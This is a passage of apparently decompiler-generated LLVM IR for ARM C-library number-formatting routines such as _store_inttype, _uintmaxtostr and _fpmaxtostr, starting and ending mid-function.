.thread:                                          ; preds = %dec_label_pc_1983c, %dec_label_pc_1982c, %bb
  %v1_1984c = phi i32 [ %v2_19830, %dec_label_pc_1983c ], [ %v2_19834, %dec_label_pc_1982c ], [ %v4_19844, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_1984c

dec_label_pc_19850:                               ; preds = %entry
  br i1 %v2_19850, label %dec_label_pc_19860, label %dec_label_pc_19858

dec_label_pc_19858:                               ; preds = %dec_label_pc_19824, %dec_label_pc_19850
  %v0_19858 = load i32, i32* @r1, align 4
  %v1_19858 = inttoptr i32 %v0_19858 to i32*
  %v2_19858 = load i32, i32* %v1_19858, align 4
  %v3_19858 = add i32 %v0_19858, 4
  %v4_19858 = inttoptr i32 %v3_19858 to i32*
  %v5_19858 = load i32, i32* %v4_19858, align 4
  store i32 %v5_19858, i32* @r1, align 4
  ret i32 %v2_19858

dec_label_pc_19860:                               ; preds = %dec_label_pc_19850
  %v7_19860 = icmp eq i32 %v0_19818, 256
  %v0_19864 = load i32, i32* @r1, align 4
  %v1_19864 = inttoptr i32 %v0_19864 to i32*
  %v2_19864 = load i32, i32* %v1_19864, align 4
  %v2_19868 = urem i32 %v2_19864, 256
  %v2_19868.v2_19864 = select i1 %v7_19860, i32 %v2_19868, i32 %v2_19864
  br i1 %v7_19860, label %.thread2, label %dec_label_pc_19870

dec_label_pc_19870:                               ; preds = %dec_label_pc_19860
  %v7_19870 = icmp eq i32 %v0_19818, 512
  br i1 %v7_19870, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_19870
  %v4_19874 = mul i32 %v2_19868.v2_19864, 65536
  %v4_19878 = sdiv i32 %v4_19874, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19870, %dec_label_pc_19860, %bb5
  %v0_1987c = phi i32 [ %v2_19864, %dec_label_pc_19870 ], [ %v2_19868, %dec_label_pc_19860 ], [ %v4_19878, %bb5 ]
  %v3_1987c = ashr i32 %v0_1987c, 31
  store i32 %v3_1987c, i32* @r1, align 4
  ret i32 %v0_1987c

; uselistorder directives
  uselistorder i32 %v0_1987c, { 1, 0 }
  uselistorder i32 %v2_19868, { 1, 0 }
  uselistorder i32 %v2_19864, { 1, 2, 0 }
  uselistorder i32 %v2_19834, { 1, 0 }
  uselistorder i32 %v2_19830, { 1, 2, 0 }
  uselistorder i1 %v2_19850, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19858, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_19884 = icmp eq i32 %arg2, 256
  store i1 %v7_19884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19884, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_19888 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_19888, i8* %tmp3, align 1
  %v1_1988c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_1988c = phi i1 [ false, %entry ], [ %v1_1988c.pre, %bb ]
  %v0_1988c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1988c, i32 %v0_1988c)
  %v7_19890 = icmp eq i32 %arg2, 2048
  store i1 %v7_19890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19890, label %dec_label_pc_19898, label %dec_label_pc_198a0

dec_label_pc_19898:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_19898 = add i32 %tmp2, 4
  %v6_19898 = inttoptr i32 %v5_19898 to i32*
  store i32 %arg4, i32* %v6_19898, align 4
  ret i32 %tmp2

dec_label_pc_198a0:                               ; preds = %bb4
  %v7_198a0 = icmp eq i32 %arg2, 512
  store i1 %v7_198a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_198a0, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_198a0
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_198a0
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 2, 0, 3, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_198bc = icmp slt i32 %tmp21, 0
  %v2_198bc = icmp eq i32 %tmp21, 0
  store i1 %v2_198bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_198c4 = load i32, i32* @r2, align 4
  store i32 %v0_198c4, i32* %r5.global-to-local, align 4
  %v0_198c8 = load i32, i32* @r3, align 4
  store i32 %v0_198c8, i32* %r6.global-to-local, align 4
  br i1 %v1_198bc, label %dec_label_pc_198d0, label %dec_label_pc_198f0

dec_label_pc_198d0:                               ; preds = %entry
  %v1_198d0 = icmp slt i32 %v0_198c8, 0
  %v2_198d0 = icmp eq i32 %v0_198c8, 0
  store i1 %v2_198d0, i1* %cpsr_z.global-to-local, align 1
  %v1_198d4 = sub i32 0, %tmp21
  store i32 %v1_198d4, i32* %r7.global-to-local, align 4
  br i1 %v1_198d0, label %dec_label_pc_198dc, label %dec_label_pc_198f0

dec_label_pc_198dc:                               ; preds = %dec_label_pc_198d0
  %v1_198e0 = sub i32 0, %v0_198c4
  store i32 %v1_198e0, i32* %r5.global-to-local, align 4
  %v2_198e0 = icmp eq i32 %v0_198c4, 0
  %v2_198e4 = icmp eq i1 %v2_198e0, false
  %v5_198e4 = sext i1 %v2_198e4 to i32
  %v6_198e4 = sub i32 %v5_198e4, %v0_198c8
  store i32 %v6_198e4, i32* %r6.global-to-local, align 4
  %v19_198e4 = icmp eq i32 %v6_198e4, 0
  store i1 %v19_198e4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_198f8

dec_label_pc_198f0:                               ; preds = %dec_label_pc_198d0, %entry
  br label %dec_label_pc_198f8

dec_label_pc_198f8:                               ; preds = %dec_label_pc_198dc, %dec_label_pc_198f0
  %storemerge = phi i8 [ 0, %dec_label_pc_198f0 ], [ 1, %dec_label_pc_198dc ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_19900 = load i32, i32* %r7.global-to-local, align 4
  %v2_19908 = udiv i32 -1, %v0_19900
  store i32 %v2_19908, i32* %fp.global-to-local, align 4
  %v3_19918 = urem i32 -1, %v0_19900
  %v1_1991c = add i32 %v3_19918, 1
  store i32 %v1_1991c, i32* %sb.global-to-local, align 4
  %v9_19920 = icmp eq i32 %v1_1991c, %v0_19900
  store i1 %v9_19920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19920, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_198f8
  %v1_19924 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_19924, i32* %sb.global-to-local, align 4
  %v2_19928 = add i32 %v2_19908, 1
  store i32 %v2_19928, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_198f8, %bb
  %v0_1992c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1992c, i32* %sl.global-to-local, align 4
  %v0_19930 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19930, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19934

dec_label_pc_19934thread-pre-split:               ; preds = %bb25
  %v0_19934.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_19938.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1993c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19934

dec_label_pc_19934:                               ; preds = %dec_label_pc_19934thread-pre-split, %.thread
  %v0_199b8 = phi i32 [ %v0_1993c.pre, %dec_label_pc_19934thread-pre-split ], [ %v0_19900, %.thread ]
  %v0_199b0 = phi i32 [ %v0_19938.pre, %dec_label_pc_19934thread-pre-split ], [ %v0_19930, %.thread ]
  %v0_1994c = phi i32 [ %v0_19934.pr, %dec_label_pc_19934thread-pre-split ], [ %v0_1992c, %.thread ]
  %v2_19934 = icmp eq i32 %v0_1994c, 0
  store i1 %v2_19934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19934, label %dec_label_pc_199ac, label %dec_label_pc_19944

dec_label_pc_19944:                               ; preds = %dec_label_pc_19934
  %v2_19948 = udiv i32 %v0_1994c, %v0_199b8
  %v3_19948 = urem i32 %v0_1994c, %v0_199b8
  store i32 %v2_19948, i32* %sl.global-to-local, align 4
  %v2_19968 = udiv i32 %v0_199b0, %v0_199b8
  %v3_19968 = urem i32 %v0_199b0, %v0_199b8
  %v0_1996c = load i32, i32* %sb.global-to-local, align 4
  %v2_1996c = mul i32 %v0_1996c, %v3_19948
  %v2_19974 = add i32 %v2_1996c, %v3_19968
  store i32 %v2_19974, i32* %r5.global-to-local, align 4
  %v0_19980 = load i32, i32* %fp.global-to-local, align 4
  %v2_19980 = mul i32 %v0_19980, %v3_19948
  %v2_19988 = add i32 %v2_19980, %v2_19968
  %v2_19990 = udiv i32 %v2_19974, %v0_199b8
  %v2_19998 = add i32 %v2_19988, %v2_19990
  br label %dec_label_pc_199c4

dec_label_pc_199ac:                               ; preds = %dec_label_pc_19934
  %v2_199ac = udiv i32 %v0_199b0, %v0_199b8
  br label %dec_label_pc_199c4

dec_label_pc_199c4:                               ; preds = %dec_label_pc_19944, %dec_label_pc_199ac
  %storemerge28 = phi i32 [ %v2_199ac, %dec_label_pc_199ac ], [ %v2_19998, %dec_label_pc_19944 ]
  %v0_199e0 = phi i32 [ %v2_199ac, %dec_label_pc_199ac ], [ %v2_19998, %dec_label_pc_19944 ]
  %v1_199e0 = phi i32 [ 0, %dec_label_pc_199ac ], [ %v2_19948, %dec_label_pc_19944 ]
  %v2_19974.pn = phi i32 [ %v0_199b0, %dec_label_pc_199ac ], [ %v2_19974, %dec_label_pc_19944 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_199cc = urem i32 %v2_19974.pn, %v0_199b8
  %v2_199c8 = icmp ugt i32 %v0_199cc, 8
  %v7_199c8 = icmp eq i32 %v0_199cc, 9
  store i1 %v7_199c8, i1* %cpsr_z.global-to-local, align 1
  %v1_199d0 = add i32 %v0_199cc, 48
  %v0_199d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_199d8 = add i32 %v0_199d8, -1
  store i32 %v1_199d8, i32* %r8.global-to-local, align 4
  %v2_199dc = xor i1 %v7_199c8, true
  %v3_199dc = and i1 %v2_199c8, %v2_199dc
  %extract.t = trunc i32 %v1_199d0 to i8
  br i1 %v3_199dc, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_199c4
  %v2_199cc = add i32 %v0_199cc, %tmp11
  %extract.t9 = trunc i32 %v2_199cc to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_199c4, %bb24
  %v0_199e4.off0 = phi i8 [ %extract.t, %dec_label_pc_199c4 ], [ %extract.t9, %bb24 ]
  %v2_199e0 = or i32 %v0_199e0, %v1_199e0
  %v4_199e0 = icmp eq i32 %v2_199e0, 0
  store i1 %v4_199e0, i1* %cpsr_z.global-to-local, align 1
  %v3_199e4 = inttoptr i32 %v1_199d8 to i8*
  store i8 %v0_199e4.off0, i8* %v3_199e4, align 1
  %v0_199e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_199e8, label %dec_label_pc_199ec, label %dec_label_pc_19934thread-pre-split

dec_label_pc_199ec:                               ; preds = %bb25
  %v4_199ec10 = zext i8 %storemerge to i32
  store i32 %v4_199ec10, i32* @r3, align 4
  %v2_199f0 = icmp eq i8 %storemerge, 0
  store i1 %v2_199f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_199f0, label %dec_label_pc_199ec..thread2_crit_edge, label %bb26

dec_label_pc_199ec..thread2_crit_edge:            ; preds = %dec_label_pc_199ec
  %v0_199fc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_199ec
  store i32 45, i32* @r3, align 4
  %v3_199f8 = load i32, i32* %r8.global-to-local, align 4
  %v4_199f8 = add i32 %v3_199f8, -1
  %v5_199f8 = inttoptr i32 %v4_199f8 to i8*
  store i8 45, i8* %v5_199f8, align 1
  %v6_199f8 = load i32, i32* %r8.global-to-local, align 4
  %v7_199f8 = add i32 %v6_199f8, -1
  store i32 %v7_199f8, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_199ec..thread2_crit_edge, %bb26
  %v0_199fc = phi i32 [ %v0_199fc.pre, %dec_label_pc_199ec..thread2_crit_edge ], [ %v7_199f8, %bb26 ]
  ret i32 %v0_199fc

; uselistorder directives
  uselistorder i32 %v0_199cc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_199b8, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_198c4, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 4, 1, 5, 0, 7, 8, 2, 3, 9, 6, 10, 11 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_199c4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_198f8, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_19a0c = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_19a18 = add i32 %arg4, 8
  %v2_19a18 = inttoptr i32 %v1_19a18 to i8*
  %v3_19a18 = load i8, i8* %v2_19a18, align 1
  %v4_19a18 = zext i8 %v3_19a18 to i32
  store i32 %v4_19a18, i32* %sb.global-to-local, align 4
  %v1_19a1c = or i32 %v4_19a18, 32
  %v7_19a20 = icmp eq i32 %v1_19a1c, 97
  store i1 %v7_19a20, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_19a38 = inttoptr i32 %arg4 to i32*
  %v2_19a38 = load i32, i32* %v1_19a38, align 4
  store i32 %v2_19a38, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_19a40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_19a40, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i64* @global_var_105a4.705 to i32), i32* %ip.global-to-local, align 4
  br i1 %v7_19a20, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_19a48 = add nuw nsw i32 %v4_19a18, 6
  store i32 %v2_19a48, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_19a58 = phi i32 [ %v0_19a40, %entry ], [ %v2_19a48, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_19a50 = add i32 %arg4, 12
  %v2_19a50 = inttoptr i32 %v1_19a50 to i32*
  %v3_19a50 = load i32, i32* %v2_19a50, align 4
  store i32 %v3_19a50, i32* %r2.global-to-local, align 4
  %v1_19a54 = add i32 %arg4, 4
  %v2_19a54 = inttoptr i32 %v1_19a54 to i32*
  %v3_19a54 = load i32, i32* %v2_19a54, align 4
  store i32 %v3_19a54, i32* @lr, align 4
  br i1 %v7_19a20, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_19a58 = urem i32 %v1_19a58, 256
  store i32 %v2_19a58, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_19a5c = icmp slt i32 %v2_19a38, 0
  %v2_19a5c = icmp eq i32 %v2_19a38, 0
  store i1 %v2_19a5c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_19a5c, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_19a6c = and i32 %v3_19a50, 2
  %v2_19a6c = icmp eq i32 %v1_19a6c, 0
  store i1 %v2_19a6c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_19a6c, label %dec_label_pc_19a84, label %dec_label_pc_19a90

dec_label_pc_19a84:                               ; preds = %bb205
  %v1_19a84 = urem i32 %v3_19a50, 2
  %v2_19a84 = icmp eq i32 %v1_19a84, 0
  store i1 %v2_19a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19a84, label %dec_label_pc_19a94, label %dec_label_pc_19a90

dec_label_pc_19a90:                               ; preds = %dec_label_pc_19a84, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_19a84 ]
  %v0_19a90.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_19a84 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_19a90.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_19a94

dec_label_pc_19a94:                               ; preds = %dec_label_pc_19a84, %dec_label_pc_19a90
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_19a40, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_19a40, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_19ab0 = fptrunc double %arg2 to float
  %v2_19ab0 = bitcast float %v1_19ab0 to i32
  %v9_19ab0 = call i32 @__aeabi_dcmpeq(i32 %v2_19ab0, i32 %v0_19a40, i32 %v2_19ab0, i32 %v0_19a40, i32 0)
  store i32 %v9_19ab0, i32* %r0.global-to-local, align 4
  %v2_19ab4 = icmp eq i32 %v9_19ab0, 0
  store i1 %v2_19ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ab4, label %bb207, label %dec_label_pc_19ac4

bb207:                                            ; preds = %dec_label_pc_19a94
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19b78

dec_label_pc_19ac4:                               ; preds = %dec_label_pc_19a94
  %v0_19ac4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19ac4, i32* @r0, align 4
  %v0_19ac8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19ac8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_19ad4 = call i32 @__aeabi_dcmpeq(i32 %v0_19ac4, i32 %v0_19ac8, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_19ad4, i32* %r0.global-to-local, align 4
  %v2_19ad8 = icmp eq i32 %v7_19ad4, 0
  store i1 %v2_19ad8, i1* %cpsr_z.global-to-local, align 1
  %v0_19b20 = load i32, i32* %r5.global-to-local, align 4
  %v1_19b20 = sext i32 %v0_19b20 to i64
  %v2_19b20 = bitcast i64 %v1_19b20 to double
  br i1 %v2_19ad8, label %dec_label_pc_19b20, label %dec_label_pc_19ae0

dec_label_pc_19ae0:                               ; preds = %dec_label_pc_19ac4
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_19af0 = fdiv double 0.000000e+00, %v2_19b20
  %v10_19af0 = fptrunc double %v9_19af0 to float
  %v11_19af0 = bitcast float %v10_19af0 to i32
  store i32 %v11_19af0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_19afc = call i32 @__aeabi_dcmplt(i32 %v11_19af0, i32 1072693248, i32 0, i32 0)
  store i32 %v4_19afc, i32* %r0.global-to-local, align 4
  %v2_19b00 = icmp eq i32 %v4_19afc, 0
  store i1 %v2_19b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b00, label %bb208, label %dec_label_pc_19b0c

bb208:                                            ; preds = %dec_label_pc_19ae0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19cec

dec_label_pc_19b0c:                               ; preds = %dec_label_pc_19ae0
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_19cec

dec_label_pc_19b20:                               ; preds = %dec_label_pc_19ac4
  store i32 %v0_19b20, i32* @r0, align 4
  %v0_19b24 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19b24, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19b30 = fptrunc double %v2_19b20 to float
  %v2_19b30 = bitcast float %v1_19b30 to i32
  %v6_19b30 = call i32 @__aeabi_dcmplt(i32 %v2_19b30, i32 %v0_19b24, i32 0, i32 0)
  store i32 %v6_19b30, i32* %r0.global-to-local, align 4
  %v2_19b34 = icmp eq i32 %v6_19b30, 0
  store i1 %v2_19b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b34, label %dec_label_pc_19b20..thread9_crit_edge, label %bb209

dec_label_pc_19b20..thread9_crit_edge:            ; preds = %dec_label_pc_19b20
  %v0_19b54.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_19b20
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_19b3c = load i32, i32* %r6.global-to-local, align 4
  %v2_19b3c = sub i32 0, %v1_19b3c
  store i32 %v2_19b3c, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_19b3c, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_19b20..thread9_crit_edge, %bb209
  %v0_19b54 = phi i32 [ %v0_19b54.pre, %dec_label_pc_19b20..thread9_crit_edge ], [ %v2_19b3c, %bb209 ]
  %v0_19b50 = load i32, i32* %r5.global-to-local, align 4
  %v1_19b50 = sext i32 %v0_19b50 to i64
  %v2_19b50 = bitcast i64 %v1_19b50 to double
  %v9_19b58 = fmul double %v2_19b50, 0.000000e+00
  %v10_19b58 = fptrunc double %v9_19b58 to float
  %v11_19b58 = bitcast float %v10_19b58 to i32
  store i32 %v11_19b58, i32* @r2, align 4
  store i32 %v0_19b54, i32* %r3.global-to-local, align 4
  store i32 %v0_19b50, i32* @r0, align 4
  store i32 %v0_19b54, i32* %r1.global-to-local, align 4
  %v7_19b6c = call i32 @__aeabi_dcmpeq(i32 %v0_19b50, i32 %v0_19b54, i32 %v11_19b58, i32 %v0_19b54, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_19b6c, i32* %r0.global-to-local, align 4
  %v2_19b70 = icmp eq i32 %v7_19b6c, 0
  store i1 %v2_19b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b70, label %dec_label_pc_19bc4, label %.thread9.dec_label_pc_19b78_crit_edge

.thread9.dec_label_pc_19b78_crit_edge:            ; preds = %.thread9
  %v3_19b78.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_19b78

dec_label_pc_19b78:                               ; preds = %bb207, %.thread9.dec_label_pc_19b78_crit_edge
  %v3_19b78 = phi i32 [ %v3_19b78.pre, %.thread9.dec_label_pc_19b78_crit_edge ], [ %arg4, %bb207 ]
  %v1_19abc.v0_19aa85 = phi i32 [ 0, %.thread9.dec_label_pc_19b78_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_19b78, i32* %ip.global-to-local, align 4
  %v2_19b80 = add i32 %v3_19b78, 16
  %v3_19b80 = inttoptr i32 %v2_19b80 to i32*
  store i32 32, i32* %v3_19b80, align 4
  %v0_19b88 = load i32, i32* %sb.global-to-local, align 4
  %v7_19b88 = icmp eq i32 %v0_19b88, 96
  store i1 %v7_19b88, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_19b88, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_19b78
  %v5_19b9c = or i32 %v1_19abc.v0_19aa85, 4
  store i32 %v5_19b9c, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_19b78, %bb210
  %v4_19ba0 = phi i32 [ %v5_19b9c, %bb210 ], [ 3, %dec_label_pc_19b78 ]
  %v4_19ba0.v1_19abc.v0_19aa8 = select i1 %tmp274, i32 %v4_19ba0, i32 %v1_19abc.v0_19aa85
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34456), i32* %r3.global-to-local, align 4
  %v2_19bb4 = add i32 %v4_19ba0.v1_19abc.v0_19aa8, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34456)
  store i32 %v2_19bb4, i32* %r2.global-to-local, align 4
  %v2_19bb8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_19bb8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a0e0

dec_label_pc_19bc4:                               ; preds = %.thread9
  %v0_19bc4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19bc4, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_19bcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19bcc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_19bd4 = call i32 @__aeabi_dcmplt(i32 %v0_19bcc, i32 %v0_19bc4, i32 0, i32 1100470148)
  store i32 %v6_19bd4, i32* %r0.global-to-local, align 4
  %v2_19bd8 = icmp eq i32 %v6_19bd4, 0
  store i1 %v2_19bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bd8, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_19bc4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_19bc4, %bb211
  %v0_19be0 = phi i32 [ 0, %dec_label_pc_19bc4 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34432), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34432), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
